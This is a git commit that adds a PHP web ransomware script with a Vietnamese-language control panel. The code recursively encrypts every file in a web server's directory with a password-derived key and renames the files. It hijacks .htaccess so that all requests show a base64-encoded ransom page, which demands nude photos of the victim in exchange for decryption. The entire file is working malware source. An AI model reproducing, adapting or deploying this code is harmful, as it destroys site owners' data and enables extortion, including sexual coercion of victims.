4e57dc29fff7e50213d296f3488f9840d6e3224c
WakiZ <hackvuathoi@gmail.com>
2017-10-02 10:23:14 -0400

    Create ransomv1.php

---
+++ ransomv1.php
@@ -0,0 +1,239 @@
+<?php
+set_time_limit(0);
+ini_set('memory_limit', '-1');
+class d3cryptR4ns0mw4r3
+{
+   public function wkiz1nst4l1(){
+    if(!file_exists(".htawakiz")){
+      rename(".htaccess", ".htawakiz");
+      if(fwrite(fopen('.htaccess', 'w'), "#I'm W4kiZ\r\nDirectoryIndex W4kiz.php\r\nErrorDocument 404 /W4kiz.php")){
+            echo '<font color="#e60000"><i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
+      }
+      if(file_put_contents("W4kiz.php", base64_decode("PGh0bWw+DQo8aGVhZD4NCiAgIDx0aXRsZT5TaXRlIGxvY2tlZDwvdGl0bGU+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KYm9keSB7DQogICAgYmFja2dyb3VuZDogIzFBMUMxRjsNCiAgICBjb2xvcjogI2UyZTJlMjsNCn0NCmF7DQogICBjb2xvcjpncmVlbjsNCn0NCjwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+DQo8cHJlPg0KDQotWyA8Zm9udCBjb2xvcj0iZ3JlZW4iPnhvbHpzZWNbYXRdOGNoYW4uY288L2ZvbnQ+IF0tDQo8Zm9udCBzaXplPSI1Ij4gVGhpcyBpcyBhIG5vdGljZSBvZiA8YSBocmVmPSJodHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9SYW5zb213YXJlIj5yYW5zb213YXJlPC9hPi48L2ZvbnQ+PGJyPg0KPGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj4NCjxmb250IHNpemU9IjUiPg0KSG93IHRvIHJlc3RvcmUgdGhlIGJlZ2lubmluZz8NCllvdSBtdXN0IHNlbmQgYXQgbGVhc3QgMTAgbnVkZSBwaWN0dXJlcyBvZiB5b3UgdG8geG9senNlY0A4Y2hhbi5jbyBhZnRlciB0aGF0IHdlIHdpbGwgaGF2ZSB0byB2ZXJpZnkgdGhhdCB0aGUgbnVkZXMgYmVsb25nIHRvIHlvdSANCmFuZCB3ZSB3aWxsIHNob3cgeW91IGhvdyB0byBkZWNyeXB0IA0KUEVBQ0UNCn5XYWtpWn4NCjwvZm9udD4NCjwvcHJlPg0KPC9jZW50ZXI+DQo8aWZyYW1lIHdpZHRoPSIwIiBoZWlnaHQ9IjAiIHNyYz0iaHR0cHM6Ly93d3cueW91dHViZS5jb20vZW1iZWQvdmlkZW9zZXJpZXM/bGlzdD1QTDRRTVo3ZlJSbjFmeG5QYTNBRWVaVkhvdnN5bm5zY0ZUJmF1dG9wbGF5PTEmbG9vcD0xIiBmcmFtZWJvcmRlcj0iMCIgYWxsb3dmdWxsc2NyZWVuPjwvaWZyYW1lPg0KPC9ib2R5Pg0KPC9odG1sPg"))){
+            echo '<font color="#e60000"><i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  W4kiz.php (Default Page)<br>';
+      }
+    }
+   }
+   
+   public function wkizU1nst4l1(){
+
+      if( file_exists(".htawakiz") ){
+        if( unlink(".htaccess") && unlink("W4kiz.php") ){
+          echo '<font color="#e60000"><i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
+          echo '<font color="#e60000"><i class="fa fa-thumbs-o-down" aria-hidden="true"></i> W4kiz.php (Default Page)<br>';
+        }
+        rename(".htawakiz", ".htaccess");
+        if(fwrite(fopen('.htaccess', 'w'), "#I'm W4kiZ\r\nDirectoryIndex index.php\r\nErrorDocument 404 /index.php")){
+          echo '<font color="#e60000"><i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
+        }
+      }
+
+   }
+
+   public function plus(){
+      flush();
+      ob_flush();
+   }
+   public function locate(){
+        return getcwd();
+    }
+   public function wkizd1rs($dir,$method,$key){
+        switch ($method) {
+          case '1':
+            d3cryptR4ns0mw4r3::wkiz1nst4l1();
+          break;
+          case '2':
+           d3cryptR4ns0mw4r3::wkizU1nst4l1();
+          break;
+        }
+        foreach(scandir($dir) as $d)
+        {
+            if($d!='.' && $d!='..')
+            {
+                $locate = $dir.DIRECTORY_SEPARATOR.$d;
+                if(!is_dir($locate)){
+                   if(  d3cryptR4ns0mw4r3::k3l1($locate,"W4kiz.php")  && d3cryptR4ns0mw4r3::k3l1($locate,".png")  && d3cryptR4ns0mw4r3::k3l1($locate,".htaccess")  && d3cryptR4ns0mw4r3::k3l1($locate,"W4kiz.php") &&  d3cryptR4ns0mw4r3::k3l1($locate,"wakiz.php") && d3cryptR4ns0mw4r3::k3l1($locate,".htawakiz") ){
+                     switch ($method) {
+                        case '1':
+                           d3cryptR4ns0mw4r3::wkiz3nCry($key,$locate);
+                           d3cryptR4ns0mw4r3::wkiz3nD3sD1rx($locate,"1");
+                        break;
+                        case '2':
+                           d3cryptR4ns0mw4r3::wkizD3nCry($key,$locate);
+                           d3cryptR4ns0mw4r3::wkiz3nD3sD1rx($locate,"2");
+                        break;
+                     }
+                   }
+                }else{
+                  d3cryptR4ns0mw4r3::wkizd1rs($locate,$method,$key);
+                }
+            }
+            d3cryptR4ns0mw4r3::plus();
+        }
+   }
+   public function wkiz3nD3sD1rx($locate,$method){
+      switch ($method) {
+        case '1':
+          rename($locate, $locate.".wakiz");
+        break;
+        case '2':
+          $locates = str_replace(".wakiz", "", $locate);
+          rename($locate, $locates);
+        break;
+      }
+   }
+
+   public function wkiz3nCry($key,$locate){
+      $data = file_get_contents($locate);
+      $iv = mcrypt_create_iv(
+          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC),
+          MCRYPT_DEV_URANDOM
+      );
+
+      $encrypted = base64_encode(
+          $iv .
+          mcrypt_encrypt(
+            MCRYPT_RIJNDAEL_256, //Bạn cũng có thể thay đổi thuật toán mã hóa tại đây :D đã thử với MCRYPT_RIJNDAEL_256, MCRYPT_RIJNDAEL_192, MCRYPT_LOKI97...
+              hash('sha256', $key, true),
+              $data,
+              MCRYPT_MODE_CBC,
+              $iv
+          )
+      );
+      if(file_put_contents($locate,  $encrypted )){
+         echo '<body bgcolor="#000000"><center><meta charset="UTF-8"> <i aria-hidden="true"></i> <font color="#00BCD4">Khóa</font> (<font color="#40CE08">Thành công</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font></center> ';
+      }else{
+         echo '<body bgcolor="#000000"><center><meta charset="UTF-8"> <i aria-hidden="true"></i> <font color="#00BCD4">Khóa</font> (<font color="red">Tạch</font>) <font color="#FF9800">|</font> '.$locate.'</center> ';
+      }
+   }
+
+   public function wkizD3nCry($key,$locate){
+      $data = base64_decode( file_get_contents($locate) );
+      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC));
+
+      $decrypted = rtrim(
+          mcrypt_decrypt(
+            MCRYPT_RIJNDAEL_256, //Nếu bạn thay đổi thuật toán mã hóa hãy chú ý thay đổi toàn bộ nhé :D 
+              hash('sha256', $key, true),
+              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC)),
+              MCRYPT_MODE_CBC,
+              $iv
+          ),
+          "\0"
+      );
+      if(file_put_contents($locate,  $decrypted )){
+         echo '<body bgcolor="#000000"><center><meta charset="UTF-8"> <i aria-hidden="true"></i> <font color="#FFEB3B">Giải Mã</font> (<font color="#40CE08">Thành công</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font></center> ';
+      }else{
+         echo '<body bgcolor="#000000"><center><meta charset="UTF-8"> <i aria-hidden="true"></i> <font color="#FFEB3B">Giải Mã</font> (<font color="red">Tạch :< </font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font></center> ';
+      }
+   }
+
+
+
+   public function k3l1($ext,$name){
+        $re = "/({$name})/";
+        preg_match($re, $ext, $matches);
+        if($matches[1]){
+            return false;
+        }
+            return true;
+     }
+    }
+if($_POST['submit']){
+switch ($_POST['method']) {
+   case '1':
+     echo d3cryptR4ns0mw4r3::wkizd1rs(d3cryptR4ns0mw4r3::locate(),"1",$_POST['key']);
+   break;
+   case '2':
+    echo d3cryptR4ns0mw4r3::wkizd1rs(d3cryptR4ns0mw4r3::locate(),"2",$_POST['key']);
+   break;
+}
+}
+else{
+?>
+<html><head>
+<meta charset="utf-8">
+   <title>WakiZ</title>
+<style type="text/css">
+body {
+    color: #ff0000;
+}
+.selecte{
+    border-style: dotted;
+    border-color: #ff0000;
+    background-color: rgb(0, 0, 0);
+    color: #ffffff;
+}
+.input{
+    border-color: #ff0000;
+    background-color: transparent;
+    color: white;
+    text-align: center;
+}
+.submite{
+    border-color: #ff0000;
+    background-color: transparent;
+    color: #ff00ff;
+}
+input[type=password] {
+		width: 250px;
+		height: 25px;
+		color: red;
+		background: #000000;
+		border: 1px dotted red;
+		padding: 5px;
+		margin-left: 20px;
+		text-align: center;
+	}
+	input[type=dirwilllock] {
+		width: 250px;
+		height: 25px;
+		color: red;
+		background: #000000;
+		border: 1px dotted red;
+		padding: 5px;
+		margin-left: 20px;
+		text-align: center;
+	}
+html {
+		background: url(http://img12.deviantart.net/d186/i/2014/108/6/7/yukinoshita_yukino_by_overflyiv-d7eyl0n.png) no-repeat center center fixed; 
+	-webkit-background-size: cover;
+	-moz-background-size: cover;
+	-o-background-size: cover;
+	background-size: cover;
+	}
+.result{
+  text-align: left;
+}
+</style>
+<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
+</head>
+<body>
+<div class="result">
+<center>
+<br>
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+
+<fieldset>
+	Password
+  <form action="" method="post" style=" text-align: center;">
+  <input type="password" name="key" class="input" placeholder="Locked/Unlocked me"> <br><br>
+  <select name="method" class="selecte">
+     <option value="1">Mã Hóa</option>
+     <option value="2">Giải mã</option>
+  </select>
+  <br>
+  <input type="dirwilllock" name="url" class="input" placeholder="<?= d3cryptR4ns0mw4r3::locate(); ?>" value="<?= d3cryptR4ns0mw4r3::locate(); ?>" disabled>
+  <br>
+<br>
+
+  <input type="submit" name="submit" class="submite" value="Bắt đầu">
+	</form>
+	<pre style="text-align: left;"></fieldset>
+</center>
+</div>
+<iframe width="0" height="0" scr="https:///www.youtube.com/embed/gdidfRamFcc?rel=0;autoplay=1" frameborder="0" allowfullscreen></iframe>
+<?php
+}
+?>
+</body></html>
